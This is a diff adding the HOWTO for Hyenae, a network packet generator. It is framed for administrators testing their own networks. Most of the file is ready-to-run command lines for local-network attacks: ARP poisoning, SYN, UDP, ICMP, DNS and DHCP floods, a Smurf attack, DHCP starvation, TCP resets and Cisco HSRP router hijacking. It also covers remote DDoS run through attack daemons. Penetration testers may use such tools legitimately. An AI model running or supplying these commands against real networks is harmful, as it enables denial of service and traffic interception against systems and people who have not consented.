@@ -1,0 +1,348 @@
+--------------------------------------------------------------------------------
+
+                                Hyenae Howto
+
+--------------------------------------------------------------------------------
+
+  Hyenae
+    Advanced Network Packet Generator
+
+  Copyright (C) 2009 - 2010 Robin Richter
+
+  Contact  : richterr@users.sourceforge.net
+  Homepage : http://sourceforge.net/projects/hyenae/
+
+--------------------------------------------------------------------------------
+
+  1. Introduction
+
+  The following document is a brief overview of the Hyenae utility suite and its
+  command line usage. The following paragraphs outline how Hyenae can be used
+  to reproduce low level ethernet attack scenarios (such as MITM, DoS and DDoS)
+  to reveal potential security vulnerabilities of your network. Some examples
+  are enumerated here to illustrate the potential of the Hyenae utility suite.
+  These concise examples are aimed at users such as network administrators or
+  analysts, and assume advanced technical knowledge. For a complete overview of
+  all possible command line arguments, please refer to the README file or the
+  Manpages.
+
+--------------------------------------------------------------------------------
+
+  2. Getting Started
+
+  * You will need to install the latest version of Hyenae (See INSTALL)
+  * You should know how address patterns work (See README or Manpages)
+  * You should have a strong knowledge of how the ethernet works (See RFC)
+
+--------------------------------------------------------------------------------
+
+  3. Determining Available Network Interfaces
+
+  Firstly, you will need to select the network interface to operate on. You
+  can obtain a list of all available network interfaces and the corresponding
+  interface index, by starting Hyenae with the -l argument. On UNIX-based
+  operating systems, you will need root privileges to run Hyenae.
+
+  # hyenae -l
+
+  * Initializing
+  * Obtaining network interfaces
+    > 1. en0
+    > 2. fw0
+    > 3. en1
+    > 4. lo0
+  * Finished: 4 network interfaces found
+
+  You may provide the network interface either by name, using -i argument, or by
+  index, using -I argument. On Windows-based operating systems, you should use
+  only the interface index to select the network interface.
+
+--------------------------------------------------------------------------------
+
+  4. Selecting an Attack Protocol
+
+  The next step is to determine the attack protocol you want to use. Choose an
+  attack protocol based on the kind of attack you want to launch.  You can
+  obtain a list of all available attack protocols by starting Hyenae with the -L
+  argument.
+
+  # hyenae -L
+
+  * Initializing
+  * Obtaining available attacks
+    > arp-request
+    > arp-reply
+    > pppoe-discover
+    > icmp-echo
+    > icmp-unreach-tcp
+    > tcp
+    > udp
+    > dns-query
+    > dhcp-discover
+    > dhcp-request
+    > dhcp-release
+    > hsrp-hello
+    > hsrp-coup
+    > hsrp-resign
+  * Finished: 14 attack protocols available
+
+  You can provide the attack protocol by its name (-a). The attack protocols
+  use different address patterns and in certain cases, may require additional
+  protocol-dependent arguments. For more information about the required address
+  pattern format and supplementary arguments of each attack protocol, please
+  refer to the README file or the Manpages.
+
+--------------------------------------------------------------------------------
+
+  5. Attack Examples
+
+  Here are a few examples of what you can do with the Hyenae utility suite.
+  The following attack examples are based on known attack scenarios against a
+  fictional host. Most of the examples outlined below will be possible only if
+  the target host is on the same subnet as you are.
+
+    5.1 ARP-Request Flood
+
+    This example will send an unlimited amount of ARP-Request packets from a
+    random source to all available machines on the network.
+
+    # hyenae -I 3 -a arp-request -s % -d ff:ff:ff:ff:ff:ff \
+    # -S %-% -D 00:00:00:00:00:00-192.168.0.1
+
+    NOTE:
+    The hardware address strip of the source and the sender address pattern
+    will be equaly randomized to avoid corrupt packets.
+
+    5.2 ARP-Cache Poisoning
+
+    This example will send an ARP-Reply packet from a fictional source address
+    to all available machines on the network.
+
+    # hyenae -I 3 -a arp-reply -s 00:f0:21:03:c6:00 -d ff:ff:ff:ff:ff:ff \
+    # -S 11:22:33:44:55:66-192.168.0.1 -D ff:ff:ff:ff:ff:ff-0.0.0.0 -c 1
+
+    5.4 Blind PPPoE Session Initiation Flood
+
+    This example sends and inlimited amount of PPPoE-DIscovery packets with
+    set PADI flag and an incrementing session id from a random source address to
+    all available machines on the network.
+
+    # hyenae -I 3 -a pppoe-discover -o padi -s % -d ff:ff:ff:ff:ff:ff
+
+    5.5 Blind PPPoE Session Termination
+
+    This example sends and inlimited amount of PPPoE-DIscovery packets with
+    set PADT flag and an incrementing session id from an existing source adress
+    to an existing destination address.
+
+    # hyenae -I 3 -a pppoe-discover -o padt -s 11:22:33:44:55:66 \
+    # -d 44:55:66:77:88:99 -q 1 -Q 1
+
+    5.6 ICMP-Echo Flood
+
+    This example will send a random amount of ICMP-Echo packets between 1 and
+    10000 from a random source to a fictional target.
+
+    # hyenae -I 3 -a icmp-echo -s %-% -d 00:f0:21:03:c6:00-192.168.0.1 \
+    # -c 1 -C 10000
+
+    5.7 ICMP-Smurf Attack
+    This example will send an unlimited amount of ICMP-Echo packets from an
+    existing source address against a network broadcast address.
+
+    # hyenae -I 3 -a icmp-echo -s 00:f0:21:03:c6:00-192.168.0.1 \
+    # -d ff:ff:ff:ff:ff:ff-255.255.255.255
+
+    5.8 ICMP Based TCP-Connection Reset
+
+    This example will send a single ICMP "Destination Unreachable" packet with
+    the message code "Port unreachable", from a fictional source to a fictional
+    target. The secondary source and destination patterns are used to set the
+    source and dstination of the TCP packet that is attached at the end of the
+    ICMP packet.
+
+    # hyenae -I 3 -a icmp-unreach-tcp -o port \
+    # -s 00:c0:33:d4:03:06-192.168.0.2 \
+    # -d 00:f0:21:03:c6:00-192.168.0.1 \
+    # -S 00:c0:33:d4:03:06-192.168.0.2@1093 \
+    # -D 00:f0:21:03:c6:00-192.168.0.1@21 \
+    # -C 1
+
+    5.9 TCP-SYN Attack
+
+    This example will send an unlimited amount of TCP packets with set SYN flag,
+    from a random source to a fictional target, with a random send delay between
+    1 and 1000 milliseconds.
+
+    # hyenae -I 3 -a tcp -f s -s %-%@%%%% -d 00:f0:21:03:c6:00-192.168.0.1@21 \
+    # -e 1 -E 1000
+
+    5.10 TCP-Land Attack
+
+    This example will send a single TCP packet with set SYN flag and an
+    identical source and destination address.
+
+    # hyenae -I 3 -a tcp -f s -s 00:f0:21:03:c6:00-192.168.0.1@139 \
+    # -d -d 00:f0:21:03:c6:00-192.168.0.1@139 -c 1
+
+    5.11 Blind TCP-Connection Reset
+
+    This example will send an unlimited amount of TCP packets with set RST
+    flag, from a fictional random source to a fictional target, with an
+    incrementing TCP sequence number.
+
+    # hyenae -I 3 -a tcp -f r -s 00:c0:33:d4:03:06-192.168.0.2@1093 \
+    # -d 00:f0:21:03:c6:00-192.168.0.1@21 -q 1 -Q 1
+
+    5.12 UDP-Flood
+
+    This example will send an unlimited amount of UDP packets with a random
+    payload of 100 Byte, from a fictional random source to a fictional target.
+
+    # hyenae -I 3 -a udp -s %-%@%%%% -d 00:f0:21:03:c6:00-192.168.0.1@130 -p 100
+
+    5.13 DNS-Query flood
+
+    This example will send an unlimited amount of DNS query packets from a
+    random source to an existing DNS server.
+
+    # hyenae -I 3 -a dns-query -s %-% -d 00:f0:21:03:c6:00-192.168.0.1 \
+    # -y www.google.com
+
+    5.14 DHCP-Discover Flood
+
+    This example will send an unlimited amount of DHCP-Discover packets from a
+    random source to all available machines on the network. The second example
+    shows the same attack with activated "Requested IP-Address" option.
+
+    # hyenae -I 3 -a dhcp-discover -s %-0.0.0.0 \
+    # -d ff:ff:ff:ff:ff:ff-255.255.255.255
+
+    # hyenae -I 3 -a dhcp-discover -s %-0.0.0.0 \
+    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -S 192.168.%.%%
+
+    5.15 DHCP-Starvation Attack
+
+    This example will send an unlimited amount of DHCP-Request packets from a
+    random source to all available machines on the network. The DHCP-Option
+    "Server Identifier" is set to the IP-Address of the destination DHCP-Server.
+    The second example shows the same attack with activated "Requested
+    IP-Address" option.
+
+    # hyenae -I 3 -a dhcp-request -s %-0.0.0.0 \
+    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -D 192.168.0.1
+
+    # hyenae -I 3 -a dhcp-request -s %-0.0.0.0 \
+    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -S % -D 192.168.0.1
+
+    5.16 DHCP-Release Forcing
+
+    This example will send a single DHCP-Release packet from a fictional source
+    address to a fictional DHCP-Server. The DHCP-Option "Server Identifier" is
+    set to the IP-Address of the destination DHCP-Server.
+
+    # hyenae -I 3 -a dhcp-release -s 11:22:33:44:55:66-192.168.0.2 \
+    # -d 44:55:66:77:88:99-192.168.0.1 -D 192.168.0.1 -c 1
+
+    5.17 Cisco HSRP Active Router Hijacking
+
+    This example will send an unlimited amount of HSRP-Hello packets with set
+    'active' state and default authentification from a fictional source address to
+    the HSRP multicast address in an interval of 3 seconds. The virtual
+    IP-Address in this example is 172.16.40.1, the priority 1 (highest) and the
+    group number is 172.
+
+    # hyenae -I 3 -a hsrp-hello -o active -s 11:22:33:44:55:66-192.168.0.2 \
+    # -d 172.16.40.1 -z 1 -g 172 -e 3000
+
+--------------------------------------------------------------------------------
+
+  6. Starting the attack assistant
+
+  Since Hyenaes range of arguments makes it a very powerfull tool to experienced
+  network specialists and administrators, it can be way to complex for
+  unexperienced users. In order to provide an easy way to set up attack
+  scenarios without having deeper knowledge of the attack procedural itself,
+  Hyenae features a text based attack assistant that will guide unexperienced
+  users through the setup of common attack scenarios. You can activate the
+  attack assistant by simply starting Hyenae without any argument.
+
+  # hyenae
+
+  * Initializing
+  * Starting attack assistant
+
+    Select operation mode:
+    > 1. Local
+    > 2. Remote (Single Daemon)
+    > 3. Remote (Multiple Daemons)
+
+    Enter option [1-3]:
+
+  ...
+
+--------------------------------------------------------------------------------
+
+  7. Setting Up the Hyenae Daemon
+
+  Hyenae comes with a daemon for setting up remote attacks. The daemon can be
+  started with just a few arguments. The only required arguments are the network
+  interface to start incoming remote attack requests from, and either a packet
+  count or a duration limit. For a list of all available daemon options, please
+  see the README file or the Manpages.
+
+  # hyenaed -I 3 -u 10000
+
+  * Initializing
+  * Starting daemon
+  * Opening network interface (en1)
+  * Opening log file (/var/log/hyenaed.log)
+  * Binding server to *@666
+  * Hyenae Daemon v0.36-1: Online
+
+  If the port argument is unspecified, the daemon will listen on port 666 by
+  default. Alternatively, you can specify the port to listen on with the -p
+  argument.
+
+  By default the Hyenae daemon will bind it's server socket to any capable
+  network interfaces of your machine. If you want to make the daemon available
+  on a specific network interface only, you have to specify the IP-Address of
+  the network interface you want to bind it to instead by using the -a argument.
+
+  # hyenaed -I 3 -a 192.168.0.2 -u 10000
+
+  * Initializing
+  * Starting daemon
+  * Opening network interface (en1)
+  * Opening log file (/var/log/hyenaed.log)
+  * Binding server to 192.168.0.2@666
+  * Hyenae Daemon v0.36-1: Online
+
+--------------------------------------------------------------------------------
+
+  8. Starting a Remote Attack
+
+  Starting a remote attack is similar to starting a local one. However, instead
+  of defining a network interface to operate on, you will need to specify the
+  remote daemon(s) you want to launch the attack from. You can specify either
+  a single remote attack daemon to attack from (-r), or multiple ones by passing
+  a file containing the list of remote daemon addresses (-R). On UNIX-based
+  operating systems you will need root privileges to run the Hyenae daemon.
+
+  # hyenae -r 127.0.0.1@666 -a icmp-echo -s %-%@% -d %-%@%
+
+  * Initializing
+  * Launching remote attack
+  * Acquiring daemon on 127.0.0.1@666
+  * Sending remote attack requests
+  * Receiving remote attack results
+  * Waiting for 127.0.0.1
+    > No errors
+    > Finished: 96950 packets sent (4071900 bytes) in 10.0 seconds
+  * Finished: 96950 packets sent (4071900 bytes) in 10.2 seconds
+
+  Note that unless you specify an attack limitation (a packet count and/or an
+  attack duration), the maximum packet count and/or attack duration limit of the
+  remote daemon will be used.
+
+--------------------------------------------------------------------------------
